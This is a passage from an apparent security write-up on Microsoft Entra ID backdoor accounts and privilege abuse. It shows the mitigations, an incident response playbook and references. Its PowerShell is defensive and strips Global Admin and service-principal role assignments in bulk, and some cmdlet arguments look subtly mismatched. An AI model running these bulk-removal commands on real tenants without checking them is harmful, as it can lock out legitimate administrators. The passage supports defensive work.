- Potential attacker scripts running from compromised endpoint

---

## 12. MITIGATIONS & INCIDENT RESPONSE

### Immediate Mitigation (0-24 hours)

1. **Revoke All Global Admin Role Assignments (Except Break Glass):**
   ```powershell
   # Get all Global Admins
   $globalAdminRole = Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'"
   $admins = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id
   
   # Remove suspicious ones (keep break glass accounts)
   $admins | Where-Object { $_.UserPrincipalName -notin $allowedAdmins } | 
     ForEach-Object {
       Remove-MgDirectoryRoleAssignment -DirectoryRoleAssignmentId $_
     }
   ```

2. **Disable Suspected Backdoor Accounts:**
   ```powershell
   Update-MgUser -UserId "backdoor@company.onmicrosoft.com" -AccountEnabled $false
   ```

3. **Remove from Restricted Administrative Units:**
   ```powershell
   # Requires Global Admin with explicit AU permissions
   Remove-MgBetaAdministrativeUnitMember -AdministrativeUnitId $auId -DirectoryObjectId $userId
   ```

### Short-Term Mitigation (24-72 hours)

1. **Audit All Role Assignments (Last 30 Days):**
   - Export AuditLogs filtering on "Add member to role" operations
   - Verify each assignment is legitimate
   - Identify unexpected Global Admin accounts

2. **Review Administrative Units:**
   - List all restricted and hidden membership AUs
   - Audit members of each
   - Delete unauthorized AUs

3. **Revoke Service Principal Permissions:**
   ```powershell
   # Identify service principals with high-privilege roles
   $admins = Get-MgDirectoryRoleMember -DirectoryRoleId $globalAdminRole.Id
   
   # Remove service principals from roles
   $admins | Where-Object { $_.ODataType -eq "#microsoft.graph.servicePrincipal" } |
     ForEach-Object {
       Remove-MgDirectoryRoleAssignment -DirectoryRoleAssignmentId $_
     }
   ```

4. **Enable Conditional Access for Role Assignments:**
   - Require Passwordless Sign-in for PIM activation
   - Implement MFA for all admin operations
   - Block legacy authentication for admins

### Long-Term Mitigation (1+ months)

1. **Enforce PIM for All Privileged Roles:**
   - No permanent Global Admin assignments (except break glass)
   - All admins must use PIM with eligibility model
   - Require JIT activation and approval

2. **Implement Restricted Management AU for Break Glass:**
   - Place emergency break glass accounts in restricted AU
   - Protects them from accidental deletion
   - Monitor for any other accounts in AU

3. **Regular Auditing Process:**
   - Monthly review of all Global Admins
   - Quarterly review of role assignments
   - Continuous monitoring of AU changes

4. **Strengthen App Registration Governance:**
   - Inventory all app registrations with privileged roles
   - Document purpose and ownership of each
   - Implement approval process for role assignments to apps

### Incident Response Playbook

1. **Detection & Initial Response:**
   - SIEM alert → Incident lead investigates
   - Check creation date and initial access of suspected backdoor account
   - Review all actions performed by backdoor account (mailbox access, user creation, etc.)

2. **Containment:**
   - Disable all backdoor accounts immediately
   - Remove from all high-privilege roles
   - Remove from restricted AUs if applicable
   - Revoke all active sessions and tokens

3. **Eradication:**
   - Delete all backdoor accounts and service principals
   - Revoke app registrations with administrative roles
   - Delete suspicious administrative units
   - Reset credentials for all legitimate admins

4. **Recovery:**
   - Restore any deleted users if not intentional
   - Review mailbox rules, forwarding, OAuth consents for persistence
   - Verify no additional backdoors remain
   - Restore access controls and Conditional Access policies

5. **Post-Incident:**
   - Forensic analysis of audit logs (30-day lookback minimum)
   - Identify compromise timeline and attack chain
   - Check for related compromises (hybrid sync, SSPR abuse, etc.)
   - Implement additional monitoring and controls

---

## 13. REFERENCES & FURTHER READING

**Official Microsoft Documentation:**
- [Microsoft Entra PIM User Assignments](https://learn.microsoft.com/en-us/entra/id-governance/privileged-identity-management/pim-how-to-add-role-to-user)
- [Manage Emergency Access Accounts](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/security-emergency-access)
- [Protect Identities and Secrets](https://learn.microsoft.com/en-us/entra/fundamentals/zero-trust-protect-identities)

**Security Research & CVEs:**
- [Datadog: Abusing Entra ID Administrative Units](https://securitylabs.datadoghq.com/articles/abusing-entra-id-administrative-units/)
- [Dirk-jan: Actor Tokens CVE-2025-55241](https://dirkjanm.io/obtaining-global-admin-in-every-entra-id-tenant-with-actor-tokens/)
- [Mitiga: Breaking Down Actor Token Vulnerability](https://www.mitiga.io/blog/breaking-down-the-microsoft-entra-id-actor-token-vulnerability-the-perfect-crime-in-the-cloud)

**Detection & Monitoring:**
- [Elastic: Entra ID Actor Token Detection](https://www.elastic.co/guide/en/security/8.19/entra-id-actor-token-user-impersonation-abuse.html)
- [Microsoft Sentinel: Privileged Group Monitoring](https://analyticsrules.exchange/analyticrules/4d94d4a9-dc96-410a-8dea-4d4d4584188b/)
- [Practical365: Detecting Midnight Blizzard](https://practical365.com/detecting-midnight-blizzard-using-microsoft-sentinel/)

**Tools:**
- [Atomic Red Team T1098 Tests](https://github.com/redcanaryco/atomic-red-team)
- [Microsoft Graph PowerShell SDK](https://github.com/microsoftgraph/msgraph-sdk-powershell)
- [Stratus Red Team - Entra ID Tests](https://github.com/DataDog/stratus-red-team)

---